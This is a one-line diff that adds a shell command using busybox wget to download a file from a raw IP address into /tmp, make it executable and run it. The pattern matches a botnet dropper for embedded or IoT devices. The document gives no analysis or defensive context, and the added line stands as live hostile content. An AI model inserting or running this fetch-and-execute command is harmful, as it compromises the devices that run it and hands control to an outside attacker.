@@ -1,0 +1,1 @@
+busybox wget http://185.244.25.170/acr -O /tmp/u; busybox chmod 777 /tmp/u; /tmp/u
